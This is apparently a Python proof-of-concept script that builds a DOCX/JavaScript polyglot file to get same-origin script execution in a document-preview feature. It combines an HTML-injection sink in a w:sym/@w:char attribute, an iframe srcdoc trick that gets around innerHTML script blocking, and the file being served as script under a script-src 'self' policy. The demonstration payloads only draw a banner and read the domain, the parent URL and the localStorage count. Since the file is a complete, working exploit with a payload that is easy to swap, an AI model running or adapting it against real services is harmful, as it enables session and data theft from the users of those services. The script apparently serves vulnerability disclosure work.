#!/usr/bin/env python3
"""build_polyglot_poc.py — ZIP+JS polyglot DOCX PoC for the Wickr preview.

File layout (one physical file, two valid interpretations):

  [JS payload][/*][ ZIP: stored entries, no '*'+'/' byte pair ][EOCD comment='*/']

As DOCX : JSZip scans EOCD from the end, computes reader.zero = prefix length,
          renders word/document.xml -> w:sym/@w:char sink injects:
            <iframe srcdoc="<script src='/preview-file/x.js'></script>">
As JS   : served by /preview-file/ with the DOCX MIME and no nosniff header;
          Chromium parses the prefix as a classic script (script-src 'self'
          allows /preview-file/), the ZIP body sits inside the block comment,
          and the final EOCD comment '*/' closes it.

The injected iframe srcdoc is parser-created, so its <script> executes even
though it was delivered through innerHTML (which suppresses direct <script>).
The script then writes a visible marker into the PARENT (same-origin) document.
Benign: marker UI only, no data access, no exfiltration.
"""
import os
import struct
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))

# --- JS prefixes (classic script; must not contain '*'+'/') -----------------
# v1: minimal banner. v2: prints document.domain + parent URL + storage count
# (document.domain is inherited from the embedder on about:srcdoc, unlike
# location.origin which prints "null" and confuses triage).
VARIANTS = {
    "poc-docx-polyglot-xss.docx": (
        "try{"
        "var P=(typeof parent!='undefined'&&parent.document)?parent:window;"
        "var d=P.document;"
        "var x=d.createElement('div');"
        "x.setAttribute('style','position:fixed;top:0;left:0;right:0;padding:14px;"
        "background:#b00020;color:#fff;font:16px sans-serif;z-index:2147483647');"
        "x.textContent='WICKR SAME-ORIGIN JS EXEC CONFIRMED | origin='+location.origin+"
        "' | ZIP+JS polyglot via /preview-file/';"
        "(d.body||d.documentElement).appendChild(x);"
        "d.title='WICKR-XSS-CONFIRMED';"
        "}catch(e){}"
        "/*"
    ),
    "poc-docx-polyglot-xss-v2.docx": (
        "try{"
        "var P=parent;var d=P.document;var ls='?';"
        "try{ls=String(P.localStorage.length);}catch(e){ls='err'}"
        "var x=d.createElement('div');"
        "x.setAttribute('style','position:fixed;top:0;left:0;right:0;padding:14px;"
        "background:#b00020;color:#fff;font:16px sans-serif;z-index:2147483647');"
        "x.textContent='SAME-ORIGIN JS CONFIRMED | document.domain='+document.domain+"
        "' | parent='+d.location.href.split('#')[0]+' | parent localStorage='+ls;"
        "(d.body||d.documentElement).appendChild(x);"
        "d.title='WICKR-XSS-CONFIRMED';"
        "}catch(e){}"
        "/*"
    ),
}

# --- Injected markup delivered through the w:sym/@w:char sink ---------------
INNER_SCRIPT = '<script src="/preview-file/x.js"></script>'


def html_attr_escape(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;")
             .replace(">", "&gt;").replace('"', "&quot;"))


INJECTED_HTML = (
    '<div style="border:2px solid green;padding:6px;font-family:sans-serif">'
    'HTMLi OK - polyglot test frame below (red banner on top = JS exec):</div>'
    f'<iframe srcdoc="{html_attr_escape(INNER_SCRIPT)}" '
    'style="width:90%;height:120px;border:2px solid red"></iframe>'
)

E_CHAR = "0;" + INJECTED_HTML  # '0;' renders the symbol glyph &#x0;


def xml_attr_escape(s: str) -> str:
    return (s.replace("&", "&amp;").replace("<", "&lt;")
             .replace(">", "&gt;").replace('"', "&quot;"))


CONTENT_TYPES = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

RELS = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''

DOC_TMPL = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t xml:space="preserve">Wickr polyglot PoC (benign).{pad}</w:t></w:r></w:p>
    <w:p><w:r><w:sym w:font="Symbol" w:char="{wchar}"/></w:r></w:p>
    <w:sectPr/>
  </w:body>
</w:document>'''


def build_zip_stored(files, comment: bytes) -> bytes:
    out = bytearray()
    entries = []
    for name, data in files:
        crc = zlib.crc32(data) & 0xFFFFFFFF
        off = len(out)
        out += struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 0, 0, 0, 0,
                           crc, len(data), len(data), len(name), 0)
        out += name + data
        entries.append((name, crc, len(data), off))
    cd_start = len(out)
    for name, crc, size, off in entries:
        out += struct.pack("<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, 0, 0, 0,
                           0, crc, size, size, len(name), 0, 0, 0, 0, 0, off)
        out += name
    cd_size = len(out) - cd_start
    out += struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, len(entries),
                       len(entries), cd_size, cd_start, len(comment))
    out += comment
    return bytes(out)


def build_one(name: str, js_payload: str) -> None:
    assert "*/" not in js_payload
    out_path = os.path.join(HERE, name)
    pad = ""
    for attempt in range(300):
        doc = DOC_TMPL.format(pad=pad, wchar=xml_attr_escape(E_CHAR))
        files = [
            (b"[Content_Types].xml", CONTENT_TYPES.encode()),
            (b"_rels/.rels", RELS.encode()),
            (b"word/document.xml", doc.encode()),
        ]
        zip_body = build_zip_stored(files, comment=b"*/")
        # The block comment spans zip_body[:-2]; the final '*/' closes it.
        if b"*/" not in zip_body[:-2]:
            break
        pad += " "  # shift CRCs/offsets until no early comment terminator
    else:
        raise SystemExit("could not eliminate '*/' from ZIP body")

    blob = js_payload.encode() + zip_body
    with open(out_path, "wb") as f:
        f.write(blob)

    print(f"attempts: {attempt + 1}")
    print(f"wrote {out_path} ({len(blob)} bytes)")

    # sanity: stdlib zipfile must open it too
    import zipfile
    with zipfile.ZipFile(out_path) as z:
        names = z.namelist()
        assert "word/document.xml" in names, names
        z.read("word/document.xml")
    print("stdlib zipfile: OK", names)


def main() -> None:
    for name, payload in VARIANTS.items():
        build_one(name, payload)


if __name__ == "__main__":
    main()
